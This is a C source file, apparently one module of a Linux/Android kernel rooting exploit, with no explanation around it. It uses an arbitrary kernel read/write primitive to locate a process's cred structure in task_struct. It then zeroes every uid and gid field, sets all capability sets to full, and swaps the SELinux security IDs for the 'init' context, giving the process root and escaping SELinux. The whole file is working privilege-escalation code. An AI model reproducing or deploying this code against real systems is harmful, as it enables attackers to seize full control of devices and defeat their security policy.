#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <inttypes.h>
#include <errno.h>

#include "threadinfo.h"
#include "sid.h"
#include "getroot.h"

#include <stdint.h>
#include "client.h"
#include "debug.h"

#define QUOTE(str) #str
#define TOSTR(str) QUOTE(str)
#define ASMMAGIC (0xBEEFDEAD)

int read_at_address_pipe(void* address, void* buf, ssize_t len)
{
	if (client_arbitrary_read((uint64_t)address, len, buf) < 0)
		return 1;
	PDBG("KRD 0x%p len=0x%02x\n", address, (unsigned)len);
	return 0;
}

int write_at_address_pipe(void* address, void* buf, ssize_t len)
{
	if (client_arbitrary_write((uint64_t)address, len, buf) < 0)
		return 1;
	PDBG("KWR 0x%p len=0x%02x\n", address, (unsigned)len);
	return 0;
}

int get_task_struct_partial_offset(void *__kernel task)
{
	int i;
	struct task_struct_partial tsp;

	static int offset = -1;

	if (offset >= 0)
		return offset;

	for(i = 0x680; i < 0xd60; i+= sizeof(void*))
	{
		struct task_struct_partial* __kernel t = (struct task_struct_partial*)(task + i);
		if(read_at_address_pipe(t, &tsp, sizeof(tsp)))
			break;

		if (is_cpu_timer_valid(&tsp.cpu_timers[0])
			&& is_cpu_timer_valid(&tsp.cpu_timers[1])
			&& is_cpu_timer_valid(&tsp.cpu_timers[2])
			&& tsp.real_cred == tsp.cred)
		{
			break;
		}
	}
	if (i < 0xd60)
		offset = i;
	return offset;
}

int modify_task_cred_uc(void *__kernel task)
{
	int i;
	unsigned long val;
	struct cred* __kernel cred = NULL;
	struct task_security_struct* __kernel security = NULL;
	struct task_struct_partial* __user tsp;

	tsp = malloc(sizeof(*tsp));
	if (!tsp)
		return -ENOMEM;

	i = get_task_struct_partial_offset(task);
	if (i >= 0) {
		struct task_struct_partial* __kernel t = (struct task_struct_partial*)(task + i);
		if(read_at_address_pipe(t, tsp, sizeof(*tsp)) == 0)
			cred = tsp->cred;
	}

	free(tsp);
	if(cred == NULL)
		return 1;

	val = 0;
	write_at_address_pipe(&cred->uid, &val, sizeof(cred->uid));
	write_at_address_pipe(&cred->gid, &val, sizeof(cred->gid));
	write_at_address_pipe(&cred->suid, &val, sizeof(cred->suid));
	write_at_address_pipe(&cred->sgid, &val, sizeof(cred->sgid));
	write_at_address_pipe(&cred->euid, &val, sizeof(cred->euid));
	write_at_address_pipe(&cred->egid, &val, sizeof(cred->egid));
	write_at_address_pipe(&cred->fsuid, &val, sizeof(cred->fsuid));
	write_at_address_pipe(&cred->fsgid, &val, sizeof(cred->fsgid));

	val = -1;
	write_at_address_pipe(&cred->cap_inheritable.cap[0], &val, sizeof(cred->cap_inheritable.cap[0]));
	write_at_address_pipe(&cred->cap_inheritable.cap[1], &val, sizeof(cred->cap_inheritable.cap[1]));
	write_at_address_pipe(&cred->cap_permitted.cap[0], &val, sizeof(cred->cap_permitted.cap[0]));
	write_at_address_pipe(&cred->cap_permitted.cap[1], &val, sizeof(cred->cap_permitted.cap[1]));
	write_at_address_pipe(&cred->cap_effective.cap[0], &val, sizeof(cred->cap_effective.cap[0]));
	write_at_address_pipe(&cred->cap_effective.cap[1], &val, sizeof(cred->cap_effective.cap[1]));
	write_at_address_pipe(&cred->cap_bset.cap[0], &val, sizeof(cred->cap_bset.cap[0]));
	write_at_address_pipe(&cred->cap_bset.cap[1], &val, sizeof(cred->cap_bset.cap[1]));

	read_at_address_pipe(&cred->security, &security, sizeof(security));
	if ((unsigned long)security > KERNEL_START) 
	{
		struct task_security_struct tss;
		if(read_at_address_pipe(security, &tss, sizeof(tss)))
			goto end;

		if (tss.osid != 0
			&& tss.sid != 0
			&& tss.exec_sid == 0
			&& tss.create_sid == 0
			&& tss.keycreate_sid == 0
			&& tss.sockcreate_sid == 0)
		{
			unsigned int sid = get_sid("init");
			if(sid)
			{
				write_at_address_pipe(&security->osid, &sid, sizeof(security->osid));
				write_at_address_pipe(&security->sid, &sid, sizeof(security->sid));
			}
		}
	}

end:
	return 0;
}
